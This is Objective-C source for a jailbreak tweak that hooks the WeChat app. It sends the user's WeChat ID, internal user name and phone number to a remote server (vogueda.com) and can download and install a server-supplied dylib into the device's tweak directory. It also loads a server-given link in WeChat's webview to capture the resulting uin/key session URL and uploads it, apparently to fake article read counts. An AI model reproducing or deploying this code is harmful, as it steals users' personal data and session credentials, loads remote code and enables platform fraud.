//外部插件
#import "hkWeiXinPlugins.h"

#pragma GCC diagnostic ignored "-Wgnu"
#pragma GCC diagnostic ignored "-Wundef"
#pragma GCC diagnostic ignored "-Wselector"

//环境变量
//static NSString *environmentPath = @"http://www.vogueda.com/shareplatformWxTest-test/weixin/";
static NSString *environmentPath = @"http://www.vogueda.com/shareplatformWxTest/weixin/";

static CSetting *m_nCSetting = [[NSClassFromString(@"CSetting") alloc] init];

//hook版本号控制
static NSString *m_hookVersion = @"1";

static dispatch_group_t group = dispatch_group_create();
static dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);

/*
 是否有等待请求数据回来
 -1:处于初始化状态
 0: 没有数据
 1: 等待数据返回
 2: 数据返回了
 3: 数据返回错误
 4: 正在执行
 */
NSInteger  m_isRequestResult = -1;

NSMutableDictionary *m_taskDataDic = [NSMutableDictionary dictionaryWithCapacity:1];

static int m_type = 3;    //0.内部插件渠道  1.深圳周总渠道(阅读hook)  2.深圳周总渠道(公众号名片hook)
static int m_sourcetype = 3;  //外部插件来源 1触摸精灵 2 NTH 3:微商助手

//去掉特殊字符
extern "C" NSString *conversionSpecialCharacter(NSString *character){

    NSString *characterTemp = character;
    //
    //    //去掉nickname 的特殊字符
    for(int i=0; i<3;i++){
        if([characterTemp rangeOfString:@"\""].location != NSNotFound){

            characterTemp =  [characterTemp stringByReplacingOccurrencesOfString:@"\"" withString:@""];

            NSLog(@"");

        }else if([characterTemp rangeOfString:@"&"].location != NSNotFound){

            characterTemp =  [characterTemp stringByReplacingOccurrencesOfString:@"&" withString:@""];

        }else if([characterTemp rangeOfString:@"%"].location != NSNotFound){

            characterTemp =  [characterTemp stringByReplacingOccurrencesOfString:@"%" withString:@""];

        }else{
            characterTemp = [NSString stringWithFormat:@"%@",characterTemp];
            break;
        }
        
        
    }
    
    return characterTemp;
}

//字符串转dictionary
extern "C" NSMutableDictionary * strngToDictionary(NSString * strData) {
    //    @autoreleasepool {
    NSData *nsData = [strData dataUsingEncoding:NSUTF8StringEncoding];
    NSError *error;

    NSMutableDictionary *jsonData = [NSJSONSerialization
                                     JSONObjectWithData:nsData
                                     options:kNilOptions
                                     error:&error];
    return jsonData;
    //    }

}

//URL 转码
extern "C" NSString * URLEncodedString(NSString *strData)
{
    NSString *encodedString = (NSString *)
    CFURLCreateStringByAddingPercentEscapes(kCFAllocatorDefault,
                                            (CFStringRef)strData,
                                            (CFStringRef)@"!$&'()*+,-./:;=?@_~%#[]",
                                            NULL,
                                            kCFStringEncodingUTF8);
    return encodedString;
}


//上传服务器的日志
extern "C" void uploadLog(NSString *title, NSString *data){
    //读出设备信息
    NSMutableDictionary *logDic = [NSMutableDictionary dictionaryWithCapacity:12];
    [logDic setObject:@"hkWeiXinPlugins" forKey:@"ipad"];
    [logDic setObject:[m_nCSetting m_nsAliasName] forKey:@"weixinId"];
    [logDic setObject:[m_nCSetting m_nsUsrName] forKey:@"weixinUuid"];
    [logDic setObject:[m_nCSetting m_nsMobile] forKey:@"phone"];
    [logDic setObject:@"" forKey:@"taskId"];
    [logDic setObject:@"" forKey:@"taskType"];
    [logDic setObject:m_hookVersion forKey:@"hookVersion"];
    [logDic setObject:@"" forKey:@"luaVersion"];
    [logDic setObject:@"hkWeiXinPlugins" forKey:@"devType"];
    [logDic setObject:title forKey:@"logTitle"];
    [logDic setObject:data forKey:@"logContent"];

    NSData *dataJson=[NSJSONSerialization dataWithJSONObject:logDic options:NSJSONWritingPrettyPrinted error:nil];
    NSString *jsonData=[[NSString alloc]initWithData:dataJson encoding:NSUTF8StringEncoding];

    NSString *sendData = @"";

    if(jsonData != nil && ![jsonData isEqualToString:@""]){

        sendData = (NSString *) CFBridgingRelease(CFURLCreateStringByAddingPercentEscapes(kCFAllocatorDefault,
                                                                                          (CFStringRef)jsonData,
                                                                                          NULL,
                                                                                          (CFStringRef)@"!*'();:@&=+$,/?%#[]",
                                                                                          kCFStringEncodingUTF8));
    }


    // 1. URL
    NSString *urlStr = [NSString stringWithFormat:@"%@serverlog.htm?jsonLog=%@",environmentPath,sendData];

    NSLog(@"HKWeChat 发送成功给服务器 %@",urlStr);

    NSURL *url = [NSURL URLWithString:URLEncodedString(urlStr)];

    // 2. Request
    NSURLRequest *request = [NSURLRequest requestWithURL:url];

    // 3. Connection
    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {

        if (connectionError == nil) {

            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                //                self.logonResult.text = @"登录完成";

            }];
        }
    }];

    
    // num = 1
    NSLog(@"come here %@", [NSThread currentThread]);
    
}


//读取服务器发过来的类型
extern "C" NSString* geServerTypeTitle(NSString *data){

    NSString *title = [NSString stringWithFormat:@"hkWeiXinPlugins执行时的日志%@ 外部插件来源%d",data,m_sourcetype];
    return title;

}


//启动时请求的的任务数据
extern "C" void getServerData(NSString *nsUsrName,NSString *nsMobile,NSString *nsNickName,NSString *nsAliasName){

    m_isRequestResult = 1;

    uploadLog(geServerTypeTitle(@"开始请求数据"),@"开始请求");

    // 1. URL
    NSString *urlStr = [NSString stringWithFormat:@"%@weixinHookInit.htm?uuid=%@&phone=%@&aliasName=%@&type=%d&hookVersion=%@",environmentPath,nsUsrName,nsMobile,nsAliasName,m_type,m_hookVersion];

    NSURL *url = [NSURL URLWithString:urlStr];

    // 2. Request
    NSURLRequest *request = [NSURLRequest requestWithURL:url];

    NSLog(@"============ 请求回来的数据为 url:%@",urlStr);

    // 3. Connection
    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {

        if (connectionError == nil) {
            // 网络请求结束之后执行!

            // 将Data转换成字符串
            NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

//            m_taskDataDic = strngToDictionary(str);

            NSMutableDictionary *downData = strngToDictionary(str);

            NSLog(@"HKWeChat 请求回来的数据为:%@ url:%@ ",downData,str);
            m_taskDataDic = [downData mutableCopy];

            uploadLog(geServerTypeTitle(@"请求数据成功返回回来的数据"),[NSString stringWithFormat:@"数据为：%@",str]);

            if([[m_taskDataDic objectForKey:@"code"] intValue] == 0){

                m_isRequestResult = 2;

            }else{

                m_isRequestResult = 3;
            }

            // num = 2
            //            m_taskData = str;

            // 更新界面
            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                //                self.logonResult.text = @"登录完成";

            }];
        }
    }];
    
    // num = 1
    NSLog(@"come here %@", [NSThread currentThread]);
    
    //    NSURLResponse *response = nil;
    
    //    [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:NULL];
}


//发送成功标示给服务端
extern "C" void hookSuccessTask(NSString *uuid,NSString* linkUrl){

    NSString *sendData = @"";

    if(linkUrl != nil && ![linkUrl isEqualToString:@""]){

        sendData = (NSString *) CFBridgingRelease(CFURLCreateStringByAddingPercentEscapes(kCFAllocatorDefault,
                                                                                          (CFStringRef)linkUrl,
                                                                                          NULL,
                                                                                          (CFStringRef)@"!*'();:@&=+$,/?%#[]",
                                                                                          kCFStringEncodingUTF8));
    }


    // 1. URL
    NSString *urlStr = [NSString stringWithFormat:@"%@markWeixinArticleComplate.htm?uuid=%@&linkUrl=%@&type=%d&sourcetype=%d",environmentPath,uuid,sendData,m_type,m_sourcetype];

    NSLog(@"hkWeixinArticle 发送成功给服务器 %@",urlStr);


    NSURL *url = [NSURL URLWithString:urlStr];

    // 2. Request
    NSURLRequest *request = [NSURLRequest requestWithURL:url];

    // 3. Connection
    [NSURLConnection sendAsynchronousRequest:request queue:[[NSOperationQueue alloc] init] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {

        if (connectionError == nil) {
            // 网络请求结束之后执行!

            // 将Data转换成字符串
            //            NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

            // num = 2
            //            m_chatMsgData = str;

            //            NSLog(@"HKWX this is request chat (requestURL:%@) return msg %@",URLEncodedString(chatUrl),str);
            // 更新界面
            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                //                self.logonResult.text = @"登录完成";

            }];
        }
    }];
    
    
    // num = 1
    NSLog(@"come here %@", [NSThread currentThread]);
}

%hook NewMainFrameViewController

%new
- (BOOL)downHookDyLib{
    NSString *url = [m_taskDataDic objectForKey:@"dyLibUrl"];

    uploadLog(geServerTypeTitle(@"开始下载更新数据"),[NSString stringWithFormat:@"更新的链接为：%@",url]);

    if([url isEqualToString:@""] || url == nil){
        NSLog(@"hkWeiXinPlugins downURL is null");

        uploadLog(geServerTypeTitle(@"下载更新数据失败"),[NSString stringWithFormat:@"更新的链接为nil"]);

        return NO;
    }

    CURL *downDylib = curl_easy_init();
    FILE *fp;
    CURLcode imgresult;
    if(m_sourcetype == 3){
       const char *dylibPath = [[NSString stringWithFormat:@"%@/hkWeiXinPlugins.dylib",[[NSBundle mainBundle] resourcePath]] UTF8String];

        fp = fopen(dylibPath, "wb");
    }else{
        fp = fopen("/Library/MobileSubstrate/DynamicLibraries/hkWeiXinPlugins.dylib", "wb");
    }
    if (downDylib) {
        if( fp == NULL ) {
            NSLog(@"hkWeiXinPlugins-curl image failed: %@", @"File cannot be opened");

            uploadLog(geServerTypeTitle(@"下载更新数据失败"),[NSString stringWithFormat:@"下载的文件路径没有可读写权限"]);

            return NO;
        }
        curl_easy_setopt(downDylib, CURLOPT_URL, [url UTF8String]);
        curl_easy_setopt(downDylib, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(downDylib, CURLOPT_WRITEDATA, fp);

        imgresult = curl_easy_perform(downDylib);
        if( imgresult ){
            NSLog(@"hkWeiXinPlugins-curl Cannot grab the image!\n");

            uploadLog(geServerTypeTitle(@"下载更新数据失败"),[NSString stringWithFormat:@"Cannot grab the file"]);
            return NO;
        }
    }

    fclose(fp);

    curl_easy_cleanup(downDylib);

    return YES;
}

%new
- (void)updateHookDylib {
    NSLog(@"hkWeiXinPlugins now update hook...");
    //删除
//    system("cp -f /var/root/.ghost_dir/hkweixinarticle.dylib /Library/MobileSubstrate/DynamicLibraries/hkweixinarticle.dylib");
}

%new
- (void)batchMpDocReadCount:(NSString *)uuid {

    uploadLog(geServerTypeTitle(@"开始进行获取key数据,进入获取key函数"),[NSString stringWithFormat:@"key链接为:%@",[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"]]);

    NSLog(@"this is batchMpDocReadCount %@",[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"]);

    //刷key链接
    if([m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"] != nil && ![[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"] isEqualToString:@""]){

        id web = [[NSClassFromString(@"MMWebViewController") alloc] initWithURL:[NSURL URLWithString:[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"]] presentModal:NO extraInfo:nil];

        NSLog(@"this is m_fetchUinAndKeyUrl is not nill %@",web);

        uploadLog(geServerTypeTitle(@"执行初始化MMWebViewController,执行获取key方法"),@"执行完毕");


    }else{
        uploadLog(geServerTypeTitle(@"key链接为空,不能执行获取可以信息"),@"");
    }
    
}


- (void)viewDidLoad{
    %orig;

    NSLog(@"hkWeiXinPlugins this is NewMainFrameViewController currentVersion %@",m_hookVersion);

    NSString *userInfo = [NSString stringWithFormat:@"{\"nsAliasName\":\"%@\",\"nsNickName\":\"%@\",\"nsMobile\":\"%@\",\"nsUsrName\":\"%@\",\"uiSex\":\"%d\"}",[m_nCSetting m_nsAliasName],[m_nCSetting m_nsNickName],[m_nCSetting m_nsMobile],[m_nCSetting m_nsUsrName],[m_nCSetting m_uiSex]];
    NSLog(@"hkWeiXinPlugins %@",userInfo);

    uploadLog(geServerTypeTitle(@"开始进入首页"),@"进入成功");

    //异步请求数据
    dispatch_group_async(group, queue, ^{

        [NSThread sleepForTimeInterval:2];

        //请求数据
        getServerData([m_nCSetting m_nsUsrName],[m_nCSetting m_nsMobile],[m_nCSetting m_nsNickName],[m_nCSetting m_nsAliasName]);

        //等待数据返回
        while(true){
            NSLog(@"hkWeiXinPlugins 等待大数据的返回(微信页面开始)---");

            [NSThread sleepForTimeInterval:2];

            if(m_isRequestResult != 1){
                break;
            }
        }

        dispatch_async(dispatch_get_main_queue(), ^{

            NSLog(@"m_taskArrayData:hkWeiXinPlugins %@",m_taskDataDic);

            uploadLog(geServerTypeTitle(@"hkWeiXinPlugins开始进入首页"),@"进入成功");

            if(m_isRequestResult == 2){

                NSLog(@"m_fetchUinAndKeyUrl is %@",[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"]);

                m_isRequestResult = 4; //正在执行

                if([[m_taskDataDic objectForKey:@"isUpdateHook"] intValue] == 1){

                    uploadLog(geServerTypeTitle(@"isUpdateHook为1可以更新文件"),[NSString stringWithFormat:@"更新的文件路径为：%@",[m_taskDataDic objectForKey:@"dyLibUrl"]]);

                    //下载hook内容
                    if(m_sourcetype != 3){
                        if([self downHookDyLib]){
                            NSLog(@"hkWeiXinPlugins 更新成功");
                        }
                    }

                }

                //进行刷阅读量
                [self batchMpDocReadCount:[m_nCSetting m_nsUsrName]];
            }
        });
        
    });

}

%end


%hook CSetting
- (id)init{
    id ret = %orig;

    NSLog(@"hkWeiXinPlugins this is enter CSetting");

    m_nCSetting = self;
    
    return ret;
}
%end


%hook YYUIWebView
- (void)webViewDidFinishLoad:(id)arg1{
    %orig;

    NSString *jsCode = @"document.location.href";

    NSString *currentURl = [self stringByEvaluatingJavaScriptFromString:jsCode];

    NSLog(@"YYUIWebView document.location.href -------------%@",currentURl);

    if([m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"] != nil && ![[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"] isEqualToString:@""]){
        //得到
        NSArray *listUrl = [[m_taskDataDic objectForKey:@"fetchUinAndKeyUrl"] componentsSeparatedByString:@"?"];
        NSLog(@"hkWeiXinPlugins this is listUrl[0] %@",listUrl[0]);

        if([currentURl rangeOfString:listUrl[0]].location != NSNotFound){

            NSLog(@"hkWeiXinPlugins this back server url :%@ ",currentURl);

            uploadLog(geServerTypeTitle(@"获得了key上传到服务器"),[NSString stringWithFormat:@"当前的key链接为：%@",currentURl]);

            //上传给服务端
            hookSuccessTask([m_nCSetting m_nsUsrName],currentURl);
        }
    }
    
}

%end




